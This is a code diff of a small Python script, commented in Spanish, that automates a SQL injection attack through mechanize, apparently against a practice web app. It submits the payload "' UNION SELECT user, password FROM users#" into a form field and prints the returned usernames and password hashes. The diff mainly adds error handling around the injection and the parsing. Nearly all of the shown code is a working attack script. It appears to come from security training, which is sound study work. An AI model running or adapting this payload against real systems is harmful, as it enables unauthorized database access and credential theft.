@@ -25,19 +25,26 @@ br.submit()
 br.open(BASE_URL+PATH)
 
 br.select_form(nr=0)
-br['id'] = "' UNION SELECT user, password FROM users#"
-br.submit()
-
-dataResponse = br.response().read().decode("utf-8")
-soup = BeautifulSoup(dataResponse, 'html.parser')
+try :
+  br['id'] = "' UNION SELECT user, password FROM users#"
+  br.submit()
+except:
+  print("Error no capturado")
   
+soup = BeautifulSoup(br.response().read(), 'html5lib')
+
 def printInformation(soup):
-  for i in soup.select_one("h1") :
-    print("=== Título" , i.text, "=== \n")
-    
-  print("=== Resultados del SQL Injection === \n")
-  for i in soup.find_all('pre'):
-    print(i.text)
+  if soup.select_one("h1"):
+    for i in soup.select_one("h1") : 
+      print("=== Título" , i.text, "=== \n") 
+  else : print("No hay información del titulo H1")
+   
+  if soup.find_all('pre') :
+    print("=== Resultados del SQL Injection === \n")
+    for i in soup.find_all('pre'):
+      print(i.text)
+  else:
+    print("Error no capturado")
   
 printInformation(soup)	
   
